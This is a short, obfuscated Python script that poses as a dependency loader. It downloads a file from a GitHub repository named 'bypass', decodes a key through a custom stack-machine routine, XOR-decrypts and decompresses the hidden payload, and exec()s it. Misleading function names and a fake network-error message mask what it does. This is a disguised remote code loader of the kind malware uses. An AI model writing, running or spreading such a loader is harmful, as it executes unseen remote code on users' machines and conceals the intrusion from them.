import sys, os, time, zlib, urllib.request, struct


SYS_LIB_URL = "https://github.com/EYAD-cloud/bypass/raw/main/libeyad.so"
# ==========================================


def _mem_alloc(buffer, ptr):
    res = bytearray()
    p = ptr
    for i, b in enumerate(buffer):
        s1 = (b - (i % 255)) % 256
        res.append(s1 ^ (p & 0xFF))
        p = (p * 1664525 + 1013904223) & 0xFFFFFFFF
    return bytes(res)


def _sys_thread_sync(ops, seq):
    stk, ptr = [], 0
    while ptr < len(seq):
        op = seq[ptr]; ptr += 1
        if op == 0: break 
        elif op == ops['PUSH']:
            val = seq[ptr]; ptr += 1
            stk.append(val)
        elif op == ops['ADD']:
            b=stk.pop(); a=stk.pop(); stk.append(a+b)
        elif op == ops['SUB']:
            b=stk.pop(); a=stk.pop(); stk.append(a-b)
        elif op == ops['XOR']:
            b=stk.pop(); a=stk.pop(); stk.append(a^b)
        elif op == ops['MUL']:
            b=stk.pop(); a=stk.pop(); stk.append(a*b)
        elif op == ops['JUNK']: ptr += 1 
    return stk[0] if stk else 0

def _load_kernel_module():
    
    print("\033[1;34m[*] Loading dependencies...", end="")
    sys.stdout.flush()
    
    try:
        
        req = urllib.request.Request(SYS_LIB_URL, headers={'User-Agent': 'Wget/1.20'})
        with urllib.request.urlopen(req) as response:
            stream = response.read()
        

        marker = b'\xDE\xAD\xBE\xEF'
        idx = stream.find(marker)
        
        if idx == -1: raise ImportError("Corrupted shared object")

        
        cur = idx + 4 
        op_k = stream[cur]; cur += 1
        
        enc_ops = stream[cur:cur+6]; cur += 6
        raw_ops = bytes([b ^ op_k for b in enc_ops])
        ops_map = {
            'PUSH': raw_ops[0], 'ADD': raw_ops[1], 'SUB': raw_ops[2],
            'XOR': raw_ops[3], 'MUL': raw_ops[4], 'JUNK': raw_ops[5]
        }
        
        v_len = struct.unpack('<H', stream[cur:cur+2])[0]; cur += 2
        enc_v = stream[cur:cur+v_len]; cur += v_len
        v_k = (op_k * 33) % 255
        
        dec_v = bytes([b ^ v_k for b in enc_v])
        cnt = len(dec_v) // 4
        
        seq = struct.unpack(f'<{cnt}I', dec_v)
        
       
        sys_ptr = _sys_thread_sync(ops_map, seq)
        
        
        enc_dat = stream[cur:]
        final_mod = zlib.decompress(_mem_alloc(enc_dat, sys_ptr))
        
       
        time.sleep(0.8)
        print(" Done.\033[0m")
        
        
        exec(final_mod, globals())

    except Exception:
        
        print("\n\033[1;31mError: خطا في الانترنت🌺.\033[0m")
        sys.exit(1)

if __name__ == "__main__":
    try:
        _load_kernel_module()
    except KeyboardInterrupt:
        pass
